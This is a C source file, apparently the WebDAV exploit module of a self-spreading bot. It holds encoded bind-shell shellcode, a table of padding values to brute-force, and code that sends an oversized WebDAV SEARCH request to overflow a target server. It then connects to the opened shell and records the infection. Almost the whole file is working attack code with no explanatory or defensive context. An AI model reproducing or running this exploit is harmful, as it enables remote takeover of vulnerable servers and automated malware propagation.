#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_WEBDAV

unsigned char wdshellcode[] =
    // sk - rebind port 80 shellcode 0xcf = port
    "\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x58\x83\xC0\x1B\x8D\xA0\x01"
    "\xFC\xFF\xFF\x83\xE4\xFC\x8B\xEC\x33\xC9\x66\xB9\x0C\x02\x80\x30"
    "\x80\x40\xE2\xFA\x10\x68\xBF\x80\x80\x80\x0E\xCE\x8E\x6C\xF2\x7E"
    "\x33\x96\x03\x39\x35\xF8\x52\x47\x27\xE8\x1C\x15\x9A\xEE\x21\xEA"
    "\xBD\x58\x53\x47\x27\x68\x08\xBF\xCA\x1E\xF7\xF3\xB2\xDF\xB3\xB2"
    "\x80\x4B\x6D\x7C\xBB\x59\x89\x75\x2D\x24\x9A\xF0\x47\x24\x2D\xAE"
    "\x69\x65\xC9\x06\xC9\xE3\xED\xE4\x80\xDA\xD2\xE4\xE7\x21\xB0\x80"
    "\x0B\xC0\x8C\x0B\xF0\x9C\x2D\x0B\xD8\x88\x0B\x72\x0B\x7E\x01\x6F"
    "\x80\x81\x80\x80\xB3\x49\x31\x88\x68\x10\x81\x80\x80\xD2\xD6\x7F"
    "\xD7\x60\xDA\x0B\x58\x03\x46\x87\xB3\x49\x31\x85\x68\xFC\x81\x80"
    "\x80\x68\x03\x80\x80\x80\xE6\x01\x6C\x10\x81\xD4\xE8\x81\x81\x80"
    "\x80\x7F\xD7\x6C\x0B\x6C\xB3\x40\xD0\xD0\xD0\xD0\xC0\xD0\xC0\xD0"
    "\x7F\xD7\x70\x0B\x58\xE6\x47\xC5\x80\x82\x80\xE6\x47\xC5\x82\x80"
    "\xD0\x47\xC5\x84\x80\x80\x80\x80\xEA\x90\xD5\xD3\x7F\xD7\x74\x05"
    "\x40\xF5\x62\xC0\xD0\xD3\x7F\xD7\x78\xD0\xD0\xD3\x7F\xD7\x7C\x0B"
    "\x58\xB3\x40\xB3\x49\x31\x91\xD7\x0B\x7D\x73\x2B\xDF\x46\xC5\x80"
    "\xC4\x09\xDD\xBC\x09\xDD\xB8\x09\xDD\xC0\xE6\x47\xC5\xAC\x81\x81"
    "\x0D\xC5\xC4\xD0\xD5\xD1\xD1\xD1\xC1\xD1\xC9\xD1\xD1\xD6\xD1\x7F"
    "\xD7\x50\xB3\x40\xC8\xD0\x7F\xD7\x54\xB3\x40\xB3\x49\x31\x91\xD7"
    "\x0B\x7D\x73\x2B\xDF\x0D\xCD\xC4\xD1\xD5\xD0\xD0\xEA\x84\xEA\x80"
    "\xD0\xD0\xD6\xD0\x7F\xD7\x50\x01\x6C\x80\x84\x80\x80\xE8\x87\x80"
    "\x81\x80\xD4\x7F\xF5\xC8\x7F\xD7\x58\xEA\xC0\xE8\x80\x90\x80\x80"
    "\xE8\x80\xD0\x80\x80\xEA\x80\x7F\xF5\xC4\x7F\xD7\x5C\x0B\x58\x01"
    "\x43\x80\x81\x80\x80\x09\x1C\xA4\x38\x80\x80\x80\x09\x1C\xA4\x34"
    "\x80\x80\x80\x0B\x0C\xA4\x84\x84\x80\x80\x47\xC1\x7B\x10\x10\x10"
    "\x10\x46\xC1\x7F\x10\x01\x69\x02\x81\x80\x80\xEA\x80\xE8\x80\x90"
    "\x80\x80\xD1\xD0\x7F\xF5\xC4\x7F\xD7\x60\xD4\x7F\xF5\xC8\x7F\xD7"
    "\x64\x7F\xF5\xC8\x7F\xD7\x68\xB3\x40\xC8\xD0\x7F\xD7\x54\xD3\xD5"
    "\xD6\xD7\x0B\xEC\xA4\x98\x0B\xC5\xBC\x0B\xD4\x85\xF8\x83\x55\x0B"
    "\xCA\x98\x0B\xDA\xA0\x83\x5D\x63\xB9\xC9\x0B\xB4\x0B\x83\x75\xB3"
    "\x7F\x7C\xB3\x40\x2C\xBA\x44\xF4\x8B\x10\x10\x10\x10\x41\x4F\x8D"
    "\x83\x78\x6B\x6E\xBB\xFC\xA4\x94\xF5\x5D\x0B\xDA\xA4\x83\x5D\xE6"
    "\x0B\x8C\xCB\x0B\xDA\x9C\x83\x5D\x0B\x84\x0B\x83\x45\x6B\x85\x10"
    "\x10\x10\xB3\x40\x0B\x55\xDF\xDE\xDD\xDB\x42\x84\x80\xD1\xD3\x7F"
    "\xB6\x68\x18\x7F\x7F\x7F\x2B\x2D\xDB\xD9\x62\x71\x43";

struct paddings {
    int pad1;
    int pad2;
} padbrute[]= {
                  { 0x4f, 0x4e },
                  { 0x41, 0x42 },
                  { 0x41, 0x43 },
                  { 0x41, 0xc1 },
                  { 0x41, 0xc3 },
                  { 0x41, 0xc9 },
                  { 0x41, 0xca },
                  { 0x41, 0xcb },
                  { 0x41, 0xcc },
                  { 0x41, 0xcd },
                  { 0x41, 0xce },
                  { 0x41, 0xcf },
                  { 0x41, 0xd0 },
              };


unsigned int resolve(char *name)
{
    struct hostent *he;
    unsigned int ip;

    if((ip=inet_addr(name))==(-1))
    {
        if((he=gethostbyname(name))==0)
            return 0;
        memcpy(&ip,he->h_addr,4);
    }
    return ip;
}

int wdexploit(char* argv1host, int argv2port, int argv3port, int pad1, int pad2) {
    unsigned short port=0;
    char *port_to_shell="", *ip1="", data[50]="";
    unsigned int i,j;
    unsigned int ip = 0 ;
    int s;
    struct sockaddr_in crpt;
    char buffer[65536] ="";
    char request[80000];    // huuuh, what a mess! :)
    char content[] =
        "<?xml version=\"1.0\"?>\r\n"
        "<g:searchrequest xmlns:g=\"DAV:\">\r\n"
        "<g:sql>\r\n"
        "Select \"DAV:displayname\" from scope()\r\n"
        "</g:sql>\r\n"
        "</g:searchrequest>\r\n";

    *(unsigned short *)&wdshellcode[0xcf] = htons(argv3port) ^ 0x8080;

    crpt.sin_port = fhtons(argv2port);
    crpt.sin_family = AF_INET;
    crpt.sin_addr.s_addr = finet_addr(argv1host);

    if ((s = fsocket(AF_INET, SOCK_STREAM, 0)) == -1){
        return 1;
    }
    if ((fconnect(s, (struct sockaddr *) &crpt, sizeof(crpt))) == -1){

        return -1;
    }
    for(i=0;i<sizeof(buffer);buffer[i]=(char)0x43,i++);
    for(i=64000,j=0;i<sizeof(buffer)&&j<sizeof(wdshellcode)-1;buffer[i]=wdshellcode[j],i++,j++);
    buffer[283] = pad1;
    buffer[284] = pad2;
    buffer[sizeof(buffer)]=0x00;
    memset(request,0,sizeof(request));
    memset(data,0,sizeof(data));
    sprintf(request,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nContent-Length: ",buffer,argv1host);
    sprintf(request,"%s%d\r\n\r\n",request,strlen(content));
    send(s,request,strlen(request),0);
    send(s,content,strlen(content),0);

    frecv(s,data,sizeof(data),0);
    if(data[0]!=0x00) {

        fclosesocket(s);
        return -1;
    }
    fclosesocket(s);
    return 1;
}

BOOL WebDAV(EXINFO exinfo)
{
	int x = 0;
	//int shellbind = brandom(5001, 20000);
	int shellbind = 131;

    while(x <= 12) {
		if(wdexploit(exinfo.ip, exinfo.port, shellbind, padbrute[x].pad1, padbrute[x].pad2) == -1) return FALSE;
		x++;
    }

	Sleep(500);
	if(ConnectShellEx(exinfo, shellbind) == true) {
		exploit[exinfo.exploit].stats++;
		return TRUE;
	} else
		return FALSE;
}
#endif
